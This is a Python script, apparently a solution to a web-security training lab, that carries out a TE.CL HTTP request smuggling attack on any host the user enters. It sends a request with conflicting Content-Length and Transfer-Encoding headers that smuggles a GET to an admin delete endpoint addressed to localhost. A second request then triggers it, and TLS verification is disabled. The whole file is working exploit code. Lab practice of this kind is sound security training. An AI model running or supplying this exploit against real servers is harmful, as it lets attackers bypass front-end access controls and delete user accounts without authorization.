import ssl
import time
import socket

host=input("Enter host name without http or https schema\n")

print("="*60)
print("HTTP REQUEST SMUGGLING EXPLOIT - TE.CL to bypass front-end security controls")
print("="*60)

#First request smuggling
req1=f"""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

81
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

0


"""
req1=req1.replace("\n","\r\n")

print("\n" + "="*60)
print("REQUEST 1: SMUGGLING (new request will be concatinated after 0\r\n\r\n)")
print("="*60)
print(req1)

sock1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ctx1=ssl.create_default_context()
ctx1.check_hostname=False
ctx1.verify_mode=ssl.CERT_NONE
ssl1=ctx1.wrap_socket(sock1,server_hostname=host)
ssl1.connect((host, 443))
ssl1.send(req1.encode())
resp1=ssl1.recv(4096).decode()
ssl1.close()

print("\n"+"="*60)
print("RESPONSE 1: Should be 200 Ok")
print("="*60)
print(resp1[:300])

time.sleep(0.5)

"""Second request: it is a normal request which is made by other user. it will be appended after 0\r\n\r\n in req1 """
req2=f"""
POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
"""
req2=req2.replace("\n", "\r\n")

print("\n" + "="*60)
print("REQUEST 2: will be appended after 0\r\n\r\n from req1")
print("="*0)
print(req2)

sock2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ctx2=ssl.create_default_context()
ctx2.check_hostname=False
ctx2.verify_mode=ssl.CERT_NONE
ssl2=ctx2.wrap_socket(sock2, server_hostname=host)
ssl2.connect((host,443))
ssl2.send(req2.encode())
resp2=ssl2.recv(4096).decode()
ssl2.close()

print("\n" + "="*60)
print("RESPONSE 2: should be 302 Found")
print("="*60)
print(resp2)

print("\n" + "="*60)
if "302 Found" in resp2:
    print("✅ SUCCESS! Lab SOLVED!")
    print("   Check your browser - lab should show 'Congratulations'")
else:
    print("❌ No '302 Found' detected in resp2")
print("="*60)
